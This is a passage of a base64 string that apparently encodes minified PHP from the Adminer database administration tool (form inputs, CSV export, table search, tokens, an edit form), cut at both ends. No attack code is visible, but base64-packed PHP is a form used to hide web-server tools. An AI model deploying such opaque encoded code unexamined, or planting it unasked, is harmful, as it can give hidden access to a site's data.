GYoJ01heGltdW0gYWxsb3dlZCBmaWxlIHNpemUgaXMgJXNCLicsJGZlKToiIik6J0ZpbGUgZG9lcyBub3QgZXhpc3QuJyk7fWZ1bmN0aW9uDQpyZXBlYXRfcGF0dGVybigkcGYsJHkpe3JldHVybg0Kc3RyX3JlcGVhdCgiJHBmezAsNjU1MzV9IiwkeS82NTUzNSkuIiRwZnswLCIuKCR5JTY1NTM1KS4ifSI7fWZ1bmN0aW9uDQppc191dGY4KCRYKXtyZXR1cm4ocHJlZ19tYXRjaCgnfn51JywkWCkmJiFwcmVnX21hdGNoKCd+W1xcMC1cXHg4XFx4QlxceENcXHhFLVxceDFGXX4nLCRYKSk7fWZ1bmN0aW9uDQpzaG9ydGVuX3V0ZjgoJFAsJHk9ODAsJExnPSIiKXtpZighcHJlZ19tYXRjaCgiKF4oIi5yZXBlYXRfcGF0dGVybigiW1x0XHJcbiAtXHh7RkZGRn1dIiwkeSkuIikoJCk/KXUiLCRQLCRCKSlwcmVnX21hdGNoKCIoXigiLnJlcGVhdF9wYXR0ZXJuKCJbXHRcclxuIC1+XSIsJHkpLiIpKCQpPykiLCRQLCRCKTtyZXR1cm4NCmgoJEJbMV0pLiRMZy4oaXNzZXQoJEJbMl0pPyIiOiI8aT4uLi48L2k+Iik7fWZ1bmN0aW9uDQpmb3JtYXRfbnVtYmVyKCRYKXtyZXR1cm4NCnN0cnRyKG51bWJlcl9mb3JtYXQoJFgsMCwiLiIsJywnKSxwcmVnX3NwbGl0KCd+fnUnLCcwMTIzNDU2Nzg5JywtMSxQUkVHX1NQTElUX05PX0VNUFRZKSk7fWZ1bmN0aW9uDQpmcmllbmRseV91cmwoJFgpe3JldHVybg0KcHJlZ19yZXBsYWNlKCd+W15hLXowLTlfXX5pJywnLScsJFgpO31mdW5jdGlvbg0KaGlkZGVuX2ZpZWxkcygkRWYsJGtkPWFycmF5KCkpe3doaWxlKGxpc3QoJHgsJFgpPWVhY2goJEVmKSl7aWYoIWluX2FycmF5KCR4LCRrZCkpe2lmKGlzX2FycmF5KCRYKSl7Zm9yZWFjaCgkWA0KYXMkRWQ9PiRXKSRFZlskeC4iWyRFZF0iXT0kVzt9ZWxzZQ0KZWNobyc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSInLmgoJHgpLiciIHZhbHVlPSInLmgoJFgpLiciPic7fX19ZnVuY3Rpb24NCmhpZGRlbl9maWVsZHNfZ2V0KCl7ZWNobyhzaWQoKT8nPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iJy5zZXNzaW9uX25hbWUoKS4nIiB2YWx1ZT0iJy5oKHNlc3Npb25faWQoKSkuJyI+JzonJyksKFNFUlZFUiE9PW51bGw/JzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IicuRFJJVkVSLiciIHZhbHVlPSInLmgoU0VSVkVSKS4nIj4nOiIiKSwnPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcm5hbWUiIHZhbHVlPSInLmgoJF9HRVRbInVzZXJuYW1lIl0pLiciPic7fWZ1bmN0aW9uDQp0YWJsZV9zdGF0dXMxKCRRLCRDYz1mYWxzZSl7JEo9dGFibGVfc3RhdHVzKCRRLCRDYyk7cmV0dXJuKCRKPyRKOmFycmF5KCJOYW1lIj0+JFEpKTt9ZnVuY3Rpb24NCmNvbHVtbl9mb3JlaWduX2tleXMoJFEpe2dsb2JhbCRiOyRKPWFycmF5KCk7Zm9yZWFjaCgkYi0+Zm9yZWlnbktleXMoJFEpYXMkcSl7Zm9yZWFjaCgkcVsic291cmNlIl1hcyRYKSRKWyRYXVtdPSRxO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmVudW1faW5wdXQoJFUsJElhLCRvLCRZLCRrYz1udWxsKXtnbG9iYWwkYjtwcmVnX21hdGNoX2FsbCgificoKD86W14nXXwnJykqKSd+Iiwkb1sibGVuZ3RoIl0sJGFlKTskSj0oJGtjIT09bnVsbD8iPGxhYmVsPjxpbnB1dCB0eXBlPSckVSckSWEgdmFsdWU9JyRrYyciLigoaXNfYXJyYXkoJFkpP2luX2FycmF5KCRrYywkWSk6JFk9PT0wKT8iIGNoZWNrZWQiOiIiKS4iPjxpPiIuJ2VtcHR5Jy4iPC9pPjwvbGFiZWw+IjoiIik7Zm9yZWFjaCgkYWVbMV1hcyRzPT4kWCl7JFg9c3RyaXBjc2xhc2hlcyhzdHJfcmVwbGFjZSgiJyciLCInIiwkWCkpOyRjYj0oaXNfaW50KCRZKT8kWT09JHMrMTooaXNfYXJyYXkoJFkpP2luX2FycmF5KCRzKzEsJFkpOiRZPT09JFgpKTskSi49IiA8bGFiZWw+PGlucHV0IHR5cGU9JyRVJyRJYSB2YWx1ZT0nIi4oJHMrMSkuIiciLigkY2I/JyBjaGVja2VkJzonJykuJz4nLmgoJGItPmVkaXRWYWwoJFgsJG8pKS4nPC9sYWJlbD4nO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmlucHV0KCRvLCRZLCRyKXtnbG9iYWwkZywkemgsJGIsJHc7JEM9aChicmFja2V0X2VzY2FwZSgkb1siZmllbGQiXSkpO2VjaG8iPHRkIGNsYXNzPSdmdW5jdGlvbic+IjtpZihpc19hcnJheSgkWSkmJiEkcil7JERhPWFycmF5KCRZKTtpZih2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sNS40KT49MCkkRGFbXT1KU09OX1BSRVRUWV9QUklOVDskWT1jYWxsX3VzZXJfZnVuY19hcnJheSgnanNvbl9lbmNvZGUnLCREYSk7JHI9Impzb24iO30kWGY9KCR3PT0ibXNzcWwiJiYkb1siYXV0b19pbmNyZW1lbnQiXSk7aWYoJFhmJiYhJF9QT1NUWyJzYXZlIl0pJHI9bnVsbDskU2M9KGlzc2V0KCRfR0VUWyJzZWxlY3QiXSl8fCRYZj9hcnJheSgib3JpZyI9PidvcmlnaW5hbCcpOmFycmF5KCkpKyRiLT5lZGl0RnVuY3Rpb25zKCRvKTskSWE9IiBuYW1lPSdmaWVsZHNbJENdJyI7aWYoJG9bInR5cGUiXT09ImVudW0iKWVjaG8NCm5ic3AoJFNjWyIiXSkuIjx0ZD4iLiRiLT5lZGl0SW5wdXQoJF9HRVRbImVkaXQiXSwkbywkSWEsJFkpO2Vsc2V7JEljPTA7Zm9yZWFjaCgkU2MNCmFzJHg9PiRYKXtpZigkeD09PSIifHwhJFgpYnJlYWs7JEljKys7fSRLZT0oJEljPyIgb25jaGFuZ2U9XCJ2YXIgZiA9IHRoaXMuZm9ybVsnZnVuY3Rpb25bIi5oKGpzX2VzY2FwZShicmFja2V0X2VzY2FwZSgkb1siZmllbGQiXSkpKS4iXSddOyBpZiAoJEljID4gZi5zZWxlY3RlZEluZGV4KSBmLnNlbGVjdGVkSW5kZXggPSAkSWM7XCIgb25rZXl1cD0na2V5dXBDaGFuZ2UuY2FsbCh0aGlzKTsnIjoiIik7JElhLj0kS2U7JGFkPShpbl9hcnJheSgkciwkU2MpfHxpc3NldCgkU2NbJHJdKSk7ZWNobyhjb3VudCgkU2MpPjE/IjxzZWxlY3QgbmFtZT0nZnVuY3Rpb25bJENdJyBvbmNoYW5nZT0nZnVuY3Rpb25DaGFuZ2UodGhpcyk7JyIub25faGVscCgiZ2V0VGFyZ2V0KGV2ZW50KS52YWx1ZS5yZXBsYWNlKC9eU1FMXCQvLCAnJykiLDEpLiI+Ii5vcHRpb25saXN0KCRTYywkcj09PW51bGx8fCRhZD8kcjoiIikuIjwvc2VsZWN0PiI6bmJzcChyZXNldCgkU2MpKSkuJzx0ZD4nOyR0ZD0kYi0+ZWRpdElucHV0KCRfR0VUWyJlZGl0Il0sJG8sJElhLCRZKTtpZigkdGQhPSIiKWVjaG8kdGQ7ZWxzZWlmKCRvWyJ0eXBlIl09PSJzZXQiKXtwcmVnX21hdGNoX2FsbCgificoKD86W14nXXwnJykqKSd+Iiwkb1sibGVuZ3RoIl0sJGFlKTtmb3JlYWNoKCRhZVsxXWFzJHM9PiRYKXskWD1zdHJpcGNzbGFzaGVzKHN0cl9yZXBsYWNlKCInJyIsIiciLCRYKSk7JGNiPShpc19pbnQoJFkpPygkWT4+JHMpJjE6aW5fYXJyYXkoJFgsZXhwbG9kZSgiLCIsJFkpLHRydWUpKTtlY2hvIiA8bGFiZWw+PGlucHV0IHR5cGU9J2NoZWNrYm94JyBuYW1lPSdmaWVsZHNbJENdWyRzXScgdmFsdWU9JyIuKDE8PCRzKS4iJyIuKCRjYj8nIGNoZWNrZWQnOicnKS4iJEtlPiIuaCgkYi0+ZWRpdFZhbCgkWCwkbykpLic8L2xhYmVsPic7fX1lbHNlaWYocHJlZ19tYXRjaCgnfmJsb2J8Ynl0ZWF8cmF3fGZpbGV+Jywkb1sidHlwZSJdKSYmaW5pX2Jvb2woImZpbGVfdXBsb2FkcyIpKWVjaG8iPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2ZpZWxkcy0kQyckS2U+IjtlbHNlaWYoKCRkaD1wcmVnX21hdGNoKCd+dGV4dHxsb2J+Jywkb1sidHlwZSJdKSl8fHByZWdfbWF0Y2goIn5cbn4iLCRZKSl7aWYoJGRoJiYkdyE9InNxbGl0ZSIpJElhLj0iIGNvbHM9JzUwJyByb3dzPScxMiciO2Vsc2V7JEw9bWluKDEyLHN1YnN0cl9jb3VudCgkWSwiXG4iKSsxKTskSWEuPSIgY29scz0nMzAnIHJvd3M9JyRMJyIuKCRMPT0xPyIgc3R5bGU9J2hlaWdodDogMS4yZW07JyI6IiIpO31lY2hvIjx0ZXh0YXJlYSRJYT4iLmgoJFkpLic8L3RleHRhcmVhPic7fWVsc2VpZigkcj09Impzb24iKWVjaG8iPHRleHRhcmVhJElhIGNvbHM9JzUwJyByb3dzPScxMicgY2xhc3M9J2p1c2gtanMnPiIuaCgkWSkuJzwvdGV4dGFyZWE+JztlbHNleyRoZT0oIXByZWdfbWF0Y2goJ35pbnR+Jywkb1sidHlwZSJdKSYmcHJlZ19tYXRjaCgnfl4oXFxkKykoLChcXGQrKSk/JH4nLCRvWyJsZW5ndGgiXSwkQik/KChwcmVnX21hdGNoKCJ+YmluYXJ5fiIsJG9bInR5cGUiXSk/MjoxKSokQlsxXSsoJEJbM10/MTowKSsoJEJbMl0mJiEkb1sidW5zaWduZWQiXT8xOjApKTooJHpoWyRvWyJ0eXBlIl1dPyR6aFskb1sidHlwZSJdXSsoJG9bInVuc2lnbmVkIl0/MDoxKTowKSk7aWYoJHc9PSdzcWwnJiYkZy0+c2VydmVyX2luZm8+PTUuNiYmcHJlZ19tYXRjaCgnfnRpbWV+Jywkb1sidHlwZSJdKSkkaGUrPTc7ZWNobyI8aW5wdXQiLigoISRhZHx8JHI9PT0iIikmJnByZWdfbWF0Y2goJ34oPzwhbylpbnR+Jywkb1sidHlwZSJdKT8iIHR5cGU9J251bWJlciciOiIiKS4iIHZhbHVlPSciLmgoJFkpLiInIi4oJGhlPyIgbWF4bGVuZ3RoPSckaGUnIjoiIikuKHByZWdfbWF0Y2goJ35jaGFyfGJpbmFyeX4nLCRvWyJ0eXBlIl0pJiYkaGU+MjA/IiBzaXplPSc0MCciOiIiKS4iJElhPiI7fX19ZnVuY3Rpb24NCnByb2Nlc3NfaW5wdXQoJG8pe2dsb2JhbCRiOyR0PWJyYWNrZXRfZXNjYXBlKCRvWyJmaWVsZCJdKTskcj0kX1BPU1RbImZ1bmN0aW9uIl1bJHRdOyRZPSRfUE9TVFsiZmllbGRzIl1bJHRdO2lmKCRvWyJ0eXBlIl09PSJlbnVtIil7aWYoJFk9PS0xKXJldHVybg0KZmFsc2U7aWYoJFk9PSIiKXJldHVybiJOVUxMIjtyZXR1cm4rJFk7fWlmKCRvWyJhdXRvX2luY3JlbWVudCJdJiYkWT09IiIpcmV0dXJuDQpudWxsO2lmKCRyPT0ib3JpZyIpcmV0dXJuKCRvWyJvbl91cGRhdGUiXT09IkNVUlJFTlRfVElNRVNUQU1QIj9pZGZfZXNjYXBlKCRvWyJmaWVsZCJdKTpmYWxzZSk7aWYoJHI9PSJOVUxMIilyZXR1cm4iTlVMTCI7aWYoJG9bInR5cGUiXT09InNldCIpcmV0dXJuDQphcnJheV9zdW0oKGFycmF5KSRZKTtpZigkcj09Impzb24iKXskcj0iIjskWT1qc29uX2RlY29kZSgkWSx0cnVlKTtpZighaXNfYXJyYXkoJFkpKXJldHVybg0KZmFsc2U7cmV0dXJuJFk7fWlmKHByZWdfbWF0Y2goJ35ibG9ifGJ5dGVhfHJhd3xmaWxlficsJG9bInR5cGUiXSkmJmluaV9ib29sKCJmaWxlX3VwbG9hZHMiKSl7JEZjPWdldF9maWxlKCJmaWVsZHMtJHQiKTtpZighaXNfc3RyaW5nKCRGYykpcmV0dXJuDQpmYWxzZTtyZXR1cm4NCnEoJEZjKTt9cmV0dXJuJGItPnByb2Nlc3NJbnB1dCgkbywkWSwkcik7fWZ1bmN0aW9uDQpmaWVsZHNfZnJvbV9lZGl0KCl7Z2xvYmFsJFViOyRKPWFycmF5KCk7Zm9yZWFjaCgoYXJyYXkpJF9QT1NUWyJmaWVsZF9rZXlzIl1hcyR4PT4kWCl7aWYoJFghPSIiKXskWD1icmFja2V0X2VzY2FwZSgkWCk7JF9QT1NUWyJmdW5jdGlvbiJdWyRYXT0kX1BPU1RbImZpZWxkX2Z1bnMiXVskeF07JF9QT1NUWyJmaWVsZHMiXVskWF09JF9QT1NUWyJmaWVsZF92YWxzIl1bJHhdO319Zm9yZWFjaCgoYXJyYXkpJF9QT1NUWyJmaWVsZHMiXWFzJHg9PiRYKXskQz1icmFja2V0X2VzY2FwZSgkeCwxKTskSlskQ109YXJyYXkoImZpZWxkIj0+JEMsInByaXZpbGVnZXMiPT5hcnJheSgiaW5zZXJ0Ij0+MSwidXBkYXRlIj0+MSksIm51bGwiPT4xLCJhdXRvX2luY3JlbWVudCI9PigkeD09JFViLT5wcmltYXJ5KSwpO31yZXR1cm4kSjt9ZnVuY3Rpb24NCnNlYXJjaF90YWJsZXMoKXtnbG9iYWwkYiwkZzskX0dFVFsid2hlcmUiXVswXVsib3AiXT0iTElLRSAlJSI7JF9HRVRbIndoZXJlIl1bMF1bInZhbCJdPSRfUE9TVFsicXVlcnkiXTskT2M9ZmFsc2U7Zm9yZWFjaCh0YWJsZV9zdGF0dXMoJycsdHJ1ZSlhcyRRPT4kUil7JEM9JGItPnRhYmxlTmFtZSgkUik7aWYoaXNzZXQoJFJbIkVuZ2luZSJdKSYmJEMhPSIiJiYoISRfUE9TVFsidGFibGVzIl18fGluX2FycmF5KCRRLCRfUE9TVFsidGFibGVzIl0pKSl7JEk9JGctPnF1ZXJ5KCJTRUxFQ1QiLmxpbWl0KCIxIEZST00gIi50YWJsZSgkUSksIiBXSEVSRSAiLmltcGxvZGUoIiBBTkQgIiwkYi0+c2VsZWN0U2VhcmNoUHJvY2VzcyhmaWVsZHMoJFEpLGFycmF5KCkpKSwxKSk7aWYoISRJfHwkSS0+ZmV0Y2hfcm93KCkpe2lmKCEkT2Mpe2VjaG8iPHVsPlxuIjskT2M9dHJ1ZTt9ZWNobyI8bGk+Ii4oJEk/IjxhIGhyZWY9JyIuaChNRS4ic2VsZWN0PSIudXJsZW5jb2RlKCRRKS4iJndoZXJlWzBdW29wXT0iLnVybGVuY29kZSgkX0dFVFsid2hlcmUiXVswXVsib3AiXSkuIiZ3aGVyZVswXVt2YWxdPSIudXJsZW5jb2RlKCRfR0VUWyJ3aGVyZSJdWzBdWyJ2YWwiXSkpLiInPiRDPC9hPlxuIjoiJEM6IDxzcGFuIGNsYXNzPSdlcnJvcic+Ii5lcnJvcigpLiI8L3NwYW4+XG4iKTt9fX1lY2hvKCRPYz8iPC91bD4iOiI8cCBjbGFzcz0nbWVzc2FnZSc+Ii4nTm8gdGFibGVzLicpLiJcbiI7fWZ1bmN0aW9uDQpkdW1wX2hlYWRlcnMoJGlkLCRyZT1mYWxzZSl7Z2xvYmFsJGI7JEo9JGItPmR1bXBIZWFkZXJzKCRpZCwkcmUpOyRkZj0kX1BPU1RbIm91dHB1dCJdO2lmKCRkZiE9InRleHQiKWhlYWRlcigiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Ii4kYi0+ZHVtcEZpbGVuYW1lKCRpZCkuIi4kSiIuKCRkZiE9ImZpbGUiJiYhcHJlZ19tYXRjaCgnflteMC05YS16XX4nLCRkZik/Ii4kZGYiOiIiKSk7c2Vzc2lvbl93cml0ZV9jbG9zZSgpO29iX2ZsdXNoKCk7Zmx1c2goKTtyZXR1cm4kSjt9ZnVuY3Rpb24NCmR1bXBfY3N2KCRLKXtmb3JlYWNoKCRLDQphcyR4PT4kWCl7aWYocHJlZ19tYXRjaCgifltcIlxuLDtcdF1+IiwkWCl8fCRYPT09IiIpJEtbJHhdPSciJy5zdHJfcmVwbGFjZSgnIicsJyIiJywkWCkuJyInO31lY2hvDQppbXBsb2RlKCgkX1BPU1RbImZvcm1hdCJdPT0iY3N2Ij8iLCI6KCRfUE9TVFsiZm9ybWF0Il09PSJ0c3YiPyJcdCI6IjsiKSksJEspLiJcclxuIjt9ZnVuY3Rpb24NCmFwcGx5X3NxbF9mdW5jdGlvbigkciwkZSl7cmV0dXJuKCRyPygkcj09InVuaXhlcG9jaCI/IkRBVEVUSU1FKCRlLCAnJHInKSI6KCRyPT0iY291bnQgZGlzdGluY3QiPyJDT1VOVChESVNUSU5DVCAiOnN0cnRvdXBwZXIoIiRyKCIpKS4iJGUpIik6JGUpO31mdW5jdGlvbg0KZ2V0X3RlbXBfZGlyKCl7JEo9aW5pX2dldCgidXBsb2FkX3RtcF9kaXIiKTtpZighJEope2lmKGZ1bmN0aW9uX2V4aXN0cygnc3lzX2dldF90ZW1wX2RpcicpKSRKPXN5c19nZXRfdGVtcF9kaXIoKTtlbHNleyRHYz1AdGVtcG5hbSgiIiwiIik7aWYoISRHYylyZXR1cm4NCmZhbHNlOyRKPWRpcm5hbWUoJEdjKTt1bmxpbmsoJEdjKTt9fXJldHVybiRKO31mdW5jdGlvbg0KcGFzc3dvcmRfZmlsZSgkaSl7JEdjPWdldF90ZW1wX2RpcigpLiIvYWRtaW5lci5rZXkiOyRKPUBmaWxlX2dldF9jb250ZW50cygkR2MpO2lmKCRKfHwhJGkpcmV0dXJuJEo7JFFjPUBmb3BlbigkR2MsInciKTtpZigkUWMpe2NobW9kKCRHYywwNjYwKTskSj1yYW5kX3N0cmluZygpO2Z3cml0ZSgkUWMsJEopO2ZjbG9zZSgkUWMpO31yZXR1cm4kSjt9ZnVuY3Rpb24NCnJhbmRfc3RyaW5nKCl7cmV0dXJuDQptZDUodW5pcWlkKG10X3JhbmQoKSx0cnVlKSk7fWZ1bmN0aW9uDQpzZWxlY3RfdmFsdWUoJFgsJF8sJG8sJGVoKXtnbG9iYWwkYiwkYmE7aWYoaXNfYXJyYXkoJFgpKXskSj0iIjtmb3JlYWNoKCRYDQphcyRFZD0+JFcpJEouPSI8dHI+Ii4oJFghPWFycmF5X3ZhbHVlcygkWCk/Ijx0aD4iLmgoJEVkKToiIikuIjx0ZD4iLnNlbGVjdF92YWx1ZSgkVywkXywkbywkZWgpO3JldHVybiI8dGFibGUgY2VsbHNwYWNpbmc9JzAnPiRKPC90YWJsZT4iO31pZighJF8pJF89JGItPnNlbGVjdExpbmsoJFgsJG8pO2lmKCRfPT09bnVsbCl7aWYoaXNfbWFpbCgkWCkpJF89Im1haWx0bzokWCI7aWYoJEdmPWlzX3VybCgkWCkpJF89KCgkR2Y9PSJodHRwIiYmJGJhKXx8cHJlZ19tYXRjaCgnfldlYktpdH5pJywkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0pPyRYOiJodHRwczovL3d3dy5hZG1pbmVyLm9yZy9yZWRpcmVjdC8/dXJsPSIudXJsZW5jb2RlKCRYKSk7fSRKPSRiLT5lZGl0VmFsKCRYLCRvKTtpZigkSiE9PW51bGwpe2lmKCRKPT09IiIpJEo9IiZuYnNwOyI7ZWxzZWlmKCFpc191dGY4KCRKKSkkSj0iXDAiO2Vsc2VpZigkZWghPSIiJiZpc19zaG9ydGFibGUoJG8pKSRKPXNob3J0ZW5fdXRmOCgkSixtYXgoMCwrJGVoKSk7ZWxzZSRKPWgoJEopO31yZXR1cm4kYi0+c2VsZWN0VmFsKCRKLCRfLCRvLCRYKTt9ZnVuY3Rpb24NCmlzX21haWwoJGhjKXskR2E9J1stYS16MC05ISMkJSZcJyorLz0/Xl9ge3x9fl0nOyRUYj0nW2EtejAtOV0oWy1hLXowLTldezAsNjF9W2EtejAtOV0pJzskcGY9IiRHYSsoXFwuJEdhKykqQCgkVGI/XFwuKSskVGIiO3JldHVybg0KaXNfc3RyaW5nKCRoYykmJnByZWdfbWF0Y2goIiheJHBmKCxcXHMqJHBmKSpcJClpIiwkaGMpO31mdW5jdGlvbg0KaXNfdXJsKCRQKXskVGI9J1thLXowLTldKFstYS16MC05XXswLDYxfVthLXowLTldKSc7cmV0dXJuKHByZWdfbWF0Y2goIn5eKGh0dHBzPyk6Ly8oJFRiP1xcLikrJFRiKDpcXGQrKT8oLy4qKT8oXFw/LiopPygjLiopP1wkfmkiLCRQLCRCKT9zdHJ0b2xvd2VyKCRCWzFdKToiIik7fWZ1bmN0aW9uDQppc19zaG9ydGFibGUoJG8pe3JldHVybg0KcHJlZ19tYXRjaCgnfmNoYXJ8dGV4dHxsb2J8Z2VvbWV0cnl8cG9pbnR8bGluZXN0cmluZ3xwb2x5Z29ufHN0cmluZ34nLCRvWyJ0eXBlIl0pO31mdW5jdGlvbg0KY291bnRfcm93cygkUSwkWiwkemQsJFZjKXtnbG9iYWwkdzskSD0iIEZST00gIi50YWJsZSgkUSkuKCRaPyIgV0hFUkUgIi5pbXBsb2RlKCIgQU5EICIsJFopOiIiKTtyZXR1cm4oJHpkJiYoJHc9PSJzcWwifHxjb3VudCgkVmMpPT0xKT8iU0VMRUNUIENPVU5UKERJU1RJTkNUICIuaW1wbG9kZSgiLCAiLCRWYykuIikkSCI6IlNFTEVDVCBDT1VOVCgqKSIuKCR6ZD8iIEZST00gKFNFTEVDVCAxJEgkV2MpIHgiOiRIKSk7fWZ1bmN0aW9uDQpzbG93X3F1ZXJ5KCRIKXtnbG9iYWwkYiwkVDskbT0kYi0+ZGF0YWJhc2UoKTskZ2g9JGItPnF1ZXJ5VGltZW91dCgpO2lmKHN1cHBvcnQoImtpbGwiKSYmaXNfb2JqZWN0KCRoPWNvbm5lY3QoKSkmJigkbT09IiJ8fCRoLT5zZWxlY3RfZGIoJG0pKSl7JEpkPSRoLT5yZXN1bHQoIlNFTEVDVCBDT05ORUNUSU9OX0lEKCkiKTtlY2hvJzxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCnZhciB0aW1lb3V0ID0gc2V0VGltZW91dChmdW5jdGlvbiAoKSB7DQoJYWpheChcJycsanNfZXNjYXBlKE1FKSwnc2NyaXB0PWtpbGxcJywgZnVuY3Rpb24gKCkgew0KCX0sIFwndG9rZW49JywkVCwnJmtpbGw9JywkSmQsJ1wnKTsNCn0sICcsMTAwMCokZ2gsJyk7DQo8L3NjcmlwdD4NCic7fWVsc2UkaD1udWxsO29iX2ZsdXNoKCk7Zmx1c2goKTskSj1AZ2V0X2tleV92YWxzKCRILCRoLCRnaCk7aWYoJGgpe2VjaG8iPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnPmNsZWFyVGltZW91dCh0aW1lb3V0KTs8L3NjcmlwdD5cbiI7b2JfZmx1c2goKTtmbHVzaCgpO31yZXR1cm4NCmFycmF5X2tleXMoJEopO31mdW5jdGlvbg0KZ2V0X3Rva2VuKCl7JExmPXJhbmQoMSwxZTYpO3JldHVybigkTGZeJF9TRVNTSU9OWyJ0b2tlbiJdKS4iOiRMZiI7fWZ1bmN0aW9uDQp2ZXJpZnlfdG9rZW4oKXtsaXN0KCRULCRMZik9ZXhwbG9kZSgiOiIsJF9QT1NUWyJ0b2tlbiJdKTtyZXR1cm4oJExmXiRfU0VTU0lPTlsidG9rZW4iXSk9PSRUO31mdW5jdGlvbg0KbHp3X2RlY29tcHJlc3MoJFFhKXskUGI9MjU2OyRSYT04OyRqYj1hcnJheSgpOyRaZj0wOyRhZz0wO2Zvcigkcz0wOyRzPHN0cmxlbigkUWEpOyRzKyspeyRaZj0oJFpmPDw4KStvcmQoJFFhWyRzXSk7JGFnKz04O2lmKCRhZz49JFJhKXskYWctPSRSYTskamJbXT0kWmY+PiRhZzskWmYmPSgxPDwkYWcpLTE7JFBiKys7aWYoJFBiPj4kUmEpJFJhKys7fX0kT2I9cmFuZ2UoIlwwIiwiXHhGRiIpOyRKPSIiO2ZvcmVhY2goJGpiDQphcyRzPT4kaWIpeyRnYz0kT2JbJGliXTtpZighaXNzZXQoJGdjKSkkZ2M9JGFpLiRhaVswXTskSi49JGdjO2lmKCRzKSRPYltdPSRhaS4kZ2NbMF07JGFpPSRnYzt9cmV0dXJuJEo7fWZ1bmN0aW9uDQpvbl9oZWxwKCRvYiwkeGc9MCl7cmV0dXJuIiBvbm1vdXNlb3Zlcj0naGVscE1vdXNlb3Zlcih0aGlzLCBldmVudCwgIi5oKCRvYikuIiwgJHhnKTsnIG9ubW91c2VvdXQ9J2hlbHBNb3VzZW91dCh0aGlzLCBldmVudCk7JyI7fWZ1bmN0aW9uDQplZGl0X2Zvcm0oJGEsJHAsJEssJEdoKXtnbG9iYWwkYiwkdywkVCwkbjskUWc9JGItPnRhYmxlTmFtZSh0YWJsZV9zdGF0dXMxKCRhLHRydWUpKTtwYWdlX2hlYWRlcigoJEdoPydFZGl0JzonSW5zZXJ0JyksJG4sYXJyYXkoInNlbGVjdCI9PmFycmF5KCRhLCRRZykpLCRRZyk7aWYoJEs9PT1mYWxzZSllY2hvIjxwIGNsYXNzPSdlcnJvcic+Ii4nTm8gcm93cy4nLiJcbiI7ZWNobyc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBpZD0iZm9ybSI+DQonO2lmKCEkcCllY2hvIjxwIGNsYXNzPSdlcnJvcic+Ii4nWW91IGhhdmUgbm8gcHJpdmlsZWdlcyB0byB1cGRhdGUgdGhpcyB0YWJsZS4nLiJcbiI7ZWxzZXtlY2hvIjx0YWJsZSBjZWxsc3BhY2luZz0nMCcgb25rZXlkb3duPSdyZXR1cm4gZWRpdGluZ0tleWRvd24oZXZlbnQpOyc+XG4iO2ZvcmVhY2goJHANCmFzJEM9PiRvKXtlY2hvIjx0cj48dGg+Ii4kYi0+ZmllbGROYW1lKCRvKTskSmI9JF9HRVRbInNldCJdW2JyYWNrZXRfZXNjYXBlKCRDKV07aWYoJEpiPT09bnVsbCl7JEpiPSRvWyJkZWZhdWx0Il07aWYoJG9bInR5cGUiXT09ImJpdCImJnByZWdfbWF0Y2goIn5eYicoWzAxXSopJ1wkfiIsJEpiLCRVZikpJEpiPSRVZlsxXTt9JFk9KCRLIT09bnVsbD8oJEtbJENdIT0iIiYmJHc9PSJzcWwiJiZwcmVnX21hdGNoKCJ+ZW51bXxzZXR+Iiwkb1sidHlwZSJdKT8oaXNfYXJyYXkoJEtbJENdKT9hcnJheV9zdW0oJEtbJENdKTorJEtbJENdKTokS1skQ10pOighJEdoJiYkb1siYXV0b19pbmNyZW1lbnQiXT8iIjooaXNzZXQoJF9HRVRbInNlbGVjdCJdKT9mYWxzZTokSmIpKSk7aWYoISRfUE9TVFsic2F2ZSJdJiZpc19zdHJpbmcoJFkpKSRZPSRiLT5lZGl0VmFsKCRZLCRvKTskcj0oJF9QT1NUWyJzYXZlIl0/KHN0cmluZykkX1BPU1RbImZ1bmN0aW9uIl1bJENdOigkR2gmJiRvWyJvbl91cGRhdGUiXT09IkNVUlJFTlRfVElNRVNUQU1QIj8ibm93IjooJFk9PT1mYWxzZT9udWxsOigkWSE9PW51bGw/Jyc6J05VTEwnKSkpKTtpZihwcmVnX21hdGNoKCJ+dGltZX4iLCRvWyJ0eXBlIl0pJiYkWT09IkNVUlJFTlRfVElNRVNUQU1QIil7JFk9IiI7JHI9Im5vdyI7fWlucHV0KCRvLCRZLCRyKTtlY2hvIlxuIjt9aWYoIXN1cHBvcnQoInRhYmxlIikpZWNobyI8dHI+Ii4iPHRoPjxpbnB1dCBuYW1lPSdmaWVsZF9rZXlzW10nIG9ua2V5dXA9J2tleXVwQ2hhbmdlLmNhbGwodGhpcyk7JyBvbmNoYW5nZT0nZmllbGRDaGFuZ2UodGhpcyk7JyB2YWx1ZT0nJz4iLiI8dGQgY2xhc3M9J2Z1bmN0aW9uJz4iLmh0bWxfc2VsZWN0KCJmaWVsZF9mdW5zW10iLCRiLT5lZGl0RnVuY3Rpb25zKGFycmF5KCJudWxsIj0+aXNzZXQoJF9HRVRbInNlbGVjdCJdKSkpKS4iPHRkPjxpbnB1dCBuYW1lPSdmaWVsZF92YWxzW10nPiIuIlxuIjtlY2hvIjwvdGFibGU+XG4iO31lY2hvIjxwPlxuIjtpZigkcCl7ZWNobyI8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nIi4nU2F2ZScuIic+XG4iO2lmKCFpc3NldCgkX0dFVFsic2VsZWN0Il0pKWVjaG8iPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0naW5zZXJ0JyB2YWx1ZT0nIi4oJEdoPydTYXZlIGFuZCBjb250aW51ZSBlZGl0Jy4iJyBvbmNsaWNrPSdyZXR1cm4gIWFqYXhGb3JtKHRoaXMuZm9ybSwgXCIiLidTYXZpbmcnLicuLi4iLCB0aGlz